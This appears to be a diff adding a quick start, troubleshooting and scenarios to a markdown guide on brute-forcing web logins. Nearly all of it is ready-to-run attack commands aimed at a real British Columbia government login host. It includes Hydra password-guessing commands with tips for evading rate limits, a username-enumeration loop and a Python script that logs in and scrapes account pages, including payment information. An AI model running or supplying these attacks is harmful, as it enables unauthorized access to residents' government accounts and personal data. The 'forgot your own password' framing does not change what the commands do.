@@ -4,10 +4,48 @@
 
 ---
 
+## 🚀 5-Minute Quick Start
+
+**Just want to brute force NOW? Do this:**
+
+```bash
+# 1. Install Hydra
+sudo apt install hydra
+
+# 2. Get password list
+wget https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt
+
+# 3. Brute force (replace YOUR_USERNAME)
+hydra -l YOUR_USERNAME -P rockyou.txt \
+  logon7.gov.bc.ca \
+  http-post-form "/clp-cgi/capBceid/logon.cgi:user=^USER^&password=^PASS^&btnSubmit=Sign+In:F=Invalid"
+
+# 4. Wait for result
+# [80][http-post-form] host: logon7.gov.bc.ca   login: youruser   password: FOUND_PASSWORD
+```
+
+**Too slow?** Use top 1000 passwords:
+```bash
+head -1000 rockyou.txt > top1000.txt
+hydra -l YOUR_USERNAME -P top1000.txt logon7.gov.bc.ca http-post-form "..."
+```
+
+**Getting rate limited?** Slow it down:
+```bash
+hydra -l YOUR_USERNAME -P passwords.txt -t 2 -w 5 logon7.gov.bc.ca http-post-form "..."
+# -t 2 = 2 threads only
+# -w 5 = 5 second wait between tries
+```
+
+**That's it. Now read the full guide below for advanced techniques.**
+
+---
+
 ## Quick Nav
 - [Brute Force 101](#brute-force-101) - Start here
 - [ASP.NET Attacks](#aspnet-specific-attacks) - Deep dive
 - [Tools](#tools-commands) - Copy-paste ready
+- [Troubleshooting](#troubleshooting) - Fix common errors
 - [Legal Practice](#legal-practice) - Where to learn safely
 
 ---
@@ -874,6 +912,426 @@ logger.LogWarning($"Failed login: {username} from {ip} at {DateTime.Now}");
 // Alert on suspicious activity
 if (failedAttempts > 10)
     SendAlert($"Potential brute force attack from {ip}");
+```
+
+---
+
+## Troubleshooting
+
+### Common Errors & Fixes
+
+#### Error: "Hydra command not found"
+```bash
+# Fix: Install Hydra
+sudo apt update
+sudo apt install hydra
+
+# OR on macOS:
+brew install hydra
+
+# Verify installation:
+hydra -h
+```
+
+#### Error: "rockyou.txt: No such file or directory"
+```bash
+# Download rockyou wordlist
+wget https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt
+
+# OR decompress if on Kali:
+gunzip /usr/share/wordlists/rockyou.txt.gz
+
+# Verify it exists:
+ls -lh rockyou.txt
+```
+
+#### Error: "Too many connections" / Rate Limited
+```bash
+# Problem: Too many requests too fast
+# Fix: Slow down the attack
+
+# Reduce threads and add delay:
+hydra -l user -P pass.txt -t 2 -w 5 target.com http-post-form "..."
+# -t 2 = Only 2 parallel threads (default 16)
+# -w 5 = Wait 5 seconds between attempts
+
+# Or use sequential (1 at a time):
+hydra -l user -P pass.txt -t 1 -w 10 target.com http-post-form "..."
+```
+
+#### Error: "Connection refused" / "Connection timed out"
+```bash
+# Problem: Can't reach target
+
+# Check if site is up:
+ping logon7.gov.bc.ca
+curl -I https://logon7.gov.bc.ca
+
+# Check if you can access login page manually:
+curl https://logon7.gov.bc.ca/clp-cgi/capBceid/logon.cgi
+
+# If behind firewall/VPN:
+# - Connect to VPN first
+# - Check firewall rules
+# - Try from different network
+```
+
+#### Error: Hydra shows all attempts as "FOUND" (false positives)
+```bash
+# Problem: Failure detection string is wrong
+
+# Test login manually first:
+curl -X POST 'https://logon7.gov.bc.ca/clp-cgi/capBceid/logon.cgi' \
+  -d 'user=test&password=wrongpassword&btnSubmit=Sign+In' \
+  | grep -i "invalid\|error\|incorrect\|failed"
+
+# Use the exact failure string you find:
+hydra ... ":F=exact error message here"
+
+# OR use success detection instead:
+hydra ... ":S=Welcome"  # If success page contains "Welcome"
+hydra ... ":S=Dashboard"  # If redirects to dashboard
+```
+
+#### Error: "Invalid service module" / "Module not found"
+```bash
+# Problem: Wrong attack module name
+
+# Correct modules:
+http-post-form  # For HTTP POST (most common)
+https-post-form # For HTTPS POST
+http-get-form   # For HTTP GET (rare)
+http-get        # For HTTP basic auth
+http-post       # For HTTP POST basic auth
+
+# Example:
+hydra -l user -P pass.txt target.com http-post-form "/login:user=^USER^&pass=^PASS^:F=error"
+```
+
+#### Python Script: "ModuleNotFoundError: No module named 'requests'"
+```bash
+# Fix: Install requests library
+pip3 install requests
+
+# OR:
+sudo apt install python3-requests
+
+# Verify:
+python3 -c "import requests; print('OK')"
+```
+
+#### Python Script: "UnicodeDecodeError"
+```bash
+# Problem: Wordlist has weird encoding
+
+# Fix: Use latin-1 encoding instead of utf-8
+with open('passwords.txt', 'r', encoding='latin-1') as f:
+    passwords = [line.strip() for line in f]
+
+# OR clean the wordlist:
+iconv -f ISO-8859-1 -t UTF-8 rockyou.txt > rockyou-utf8.txt
+```
+
+#### Burp Suite: "Certificate verification failed"
+```bash
+# Problem: HTTPS certificate not trusted
+
+# Fix: Install Burp CA certificate
+# 1. Browse to http://burp
+# 2. Download CA Certificate
+# 3. Firefox: Settings → Certificates → Import
+# 4. Chrome: Settings → Privacy → Manage certificates → Import
+```
+
+#### Attack is too slow / Taking forever
+```bash
+# Solutions:
+
+# 1. Use smaller wordlist
+head -10000 rockyou.txt > top10k.txt
+hydra -l user -P top10k.txt ...
+
+# 2. Increase threads (if site allows)
+hydra -l user -P pass.txt -t 32 ...  # 32 threads
+
+# 3. Use custom wordlist based on target
+# Instead of 14M passwords, create smart list:
+cat > custom.txt << EOF
+Password2024!
+Summer2024!
+CompanyName123!
+Welcome123!
+EOF
+
+# 4. Use password spraying instead
+# Try 1 password against many users (faster if you have user list)
+```
+
+#### Success! Found password, but can't login manually
+```bash
+# Possible issues:
+
+# 1. Password has special characters
+# Check if Hydra URL-encoded it: %21 = ! , %40 = @
+# Try both encoded and decoded versions
+
+# 2. Case sensitivity
+# Hydra might have found "PasSWoRd123" but you're trying "password123"
+# Copy exact password from Hydra output
+
+# 3. Session/cookie requirements
+# Site might require specific cookies or session tokens
+# Use curl with cookies:
+curl -X POST 'url' -d 'user=X&pass=Y' -c cookies.txt -b cookies.txt
+
+# 4. Additional hidden form fields
+# Login form might have hidden CSRF tokens or other fields
+# View page source, look for <input type="hidden">
+# Add them to Hydra command or Python script
+```
+
+---
+
+## Attack Flow Visualization
+
+```
+┌─────────────────────────────────────────────────────────┐
+│                   BRUTE FORCE ATTACK                    │
+└─────────────────────────────────────────────────────────┘
+
+Step 1: Reconnaissance
+┌──────────────┐
+│  Browse to   │
+│  login page  │──┐
+└──────────────┘  │
+                  ▼
+              ┌──────────────┐
+              │ View source  │
+              │ Find: form   │
+              │ action, POST │
+              │ parameters   │
+              └──────────────┘
+                  │
+                  ▼
+Step 2: Capture Request
+┌────────────────┐
+│ Open DevTools  │
+│ (F12)          │──┐
+└────────────────┘  │
+                    ▼
+                ┌──────────────┐
+                │ Submit test  │
+                │ login        │──┐
+                └──────────────┘  │
+                                  ▼
+                              ┌──────────────┐
+                              │ Analyze POST │
+                              │ request:     │
+                              │ - URL        │
+                              │ - Parameters │
+                              │ - Response   │
+                              └──────────────┘
+                                  │
+                                  ▼
+Step 3: Test Manually
+┌──────────────┐
+│ Test with    │
+│ curl         │──┐
+└──────────────┘  │
+                  ▼
+              ┌──────────────┐
+              │ Identify:    │
+              │ - Success:   │
+              │   302 or     │
+              │   "Welcome"  │
+              │ - Failure:   │
+              │   "Invalid"  │
+              └──────────────┘
+                  │
+                  ▼
+Step 4: Automated Attack
+┌──────────────┐
+│ Hydra OR     │
+│ Python OR    │──┐
+│ Burp Suite   │  │
+└──────────────┘  │
+                  ▼
+              ┌──────────────┐           ┌──────────────┐
+              │ Load         │           │ Load         │
+              │ username(s)  │◄──────────┤ password     │
+              └──────────────┘           │ wordlist     │
+                  │                      └──────────────┘
+                  │
+                  ▼
+              ┌──────────────┐
+              │ For each     │
+              │ password:    │
+              │              │
+              │ 1. Send POST │
+              │ 2. Check     │
+              │    response  │
+              │ 3. If 302 or │
+              │    "Welcome" │
+              │    = SUCCESS │
+              └──────────────┘
+                  │
+                  │ ┌─────────┐
+                  ├─┤ Failed? │──► Try next password
+                  │ └─────────┘
+                  │
+                  ▼
+              ┌──────────────┐
+              │ SUCCESS!     │
+              │ Password:    │
+              │ found123!    │
+              └──────────────┘
+                  │
+                  ▼
+Step 5: Post-Exploitation
+┌──────────────┐
+│ Login with   │
+│ found creds  │──┐
+└──────────────┘  │
+                  ▼
+              ┌──────────────┐
+              │ Access       │
+              │ protected    │
+              │ resources    │
+              └──────────────┘
+```
+
+---
+
+## BC Self-Serve Specific Scenarios
+
+### Scenario 1: Forgot Your Own Password
+**You have legitimate access but forgot password**
+
+```bash
+# 1. Create custom wordlist based on YOUR password patterns
+# Think: What passwords have you used before?
+# Common patterns: Name + Year + Symbol
+
+cat > my-passwords.txt << EOF
+MyName2020!
+MyName2021!
+MyName2022!
+MyName2023!
+MyName2024!
+MyName123!
+MyName@2024
+Summer2024!
+Winter2024!
+EOF
+
+# 2. Run targeted attack (fast)
+hydra -l YOUR_REAL_USERNAME -P my-passwords.txt \
+  -t 2 -w 3 \
+  logon7.gov.bc.ca \
+  http-post-form "/clp-cgi/capBceid/logon.cgi:user=^USER^&password=^PASS^&btnSubmit=Sign+In:F=Invalid"
+
+# 3. Found: MyName2023!
+# Now you can login!
+```
+
+### Scenario 2: Session Hijacking After Login
+**BC Self-Serve has broken session management - exploit it**
+
+```python
+#!/usr/bin/env python3
+import requests
+
+# After successful login, capture session cookies
+session = requests.Session()
+
+# Login
+response = session.post(
+    'https://logon7.gov.bc.ca/clp-cgi/capBceid/logon.cgi',
+    data={
+        'user': 'your_username',
+        'password': 'found_password',
+        'btnSubmit': 'Sign In'
+    },
+    allow_redirects=True
+)
+
+# Session cookies now stored in session object
+print("[*] Session cookies:")
+for cookie in session.cookies:
+    print(f"  {cookie.name} = {cookie.value}")
+
+# Access protected pages
+messages = session.get('https://myselfserve.gov.bc.ca/Auth/Messages')
+print(f"\n[*] Messages page status: {messages.status_code}")
+
+# BC Self-Serve bug: Session expires immediately
+# Workaround: Re-login before each section
+def scrape_with_relogin(section_url):
+    # Fresh login
+    session.post(
+        'https://logon7.gov.bc.ca/clp-cgi/capBceid/logon.cgi',
+        data={'user': 'user', 'password': 'pass', 'btnSubmit': 'Sign In'}
+    )
+
+    # Immediately access section (before session expires)
+    return session.get(section_url)
+
+# Scrape all sections
+sections = [
+    'https://myselfserve.gov.bc.ca/Auth',
+    'https://myselfserve.gov.bc.ca/Auth/Messages',
+    'https://myselfserve.gov.bc.ca/Auth/PaymentInfo',
+    'https://myselfserve.gov.bc.ca/Auth/ServiceRequests'
+]
+
+for url in sections:
+    print(f"\n[*] Scraping: {url}")
+    response = scrape_with_relogin(url)
+    print(f"[*] Status: {response.status_code}")
+    print(f"[*] Length: {len(response.text)} bytes")
+```
+
+### Scenario 3: Username Enumeration
+**Figure out if username exists before brute forcing**
+
+```bash
+# Test if site reveals valid vs invalid usernames
+
+# Test 1: Known invalid user
+curl -X POST 'https://logon7.gov.bc.ca/clp-cgi/capBceid/logon.cgi' \
+  -d 'user=definitelynotauser999&password=test' \
+  | grep -i "user\|not found\|doesn't exist"
+
+# Test 2: Known valid user (yours)
+curl -X POST 'https://logon7.gov.bc.ca/clp-cgi/capBceid/logon.cgi' \
+  -d 'user=YOUR_REAL_USERNAME&password=wrongpassword' \
+  | grep -i "password\|invalid\|incorrect"
+
+# If responses differ:
+# "User not found" = invalid username
+# "Invalid password" = valid username (now you know it exists!)
+
+# Automate username enumeration:
+cat > users.txt << EOF
+admin
+administrator
+john.smith
+jane.doe
+test
+demo
+EOF
+
+# Test each username:
+while read user; do
+  response=$(curl -s -X POST 'https://logon7.gov.bc.ca/clp-cgi/capBceid/logon.cgi' \
+    -d "user=$user&password=wrongpass&btnSubmit=Sign+In")
+
+  if echo "$response" | grep -qi "password"; then
+    echo "[+] Valid username: $user"
+  elif echo "$response" | grep -qi "not found"; then
+    echo "[-] Invalid username: $user"
+  fi
+done < users.txt
 ```
 
 ---
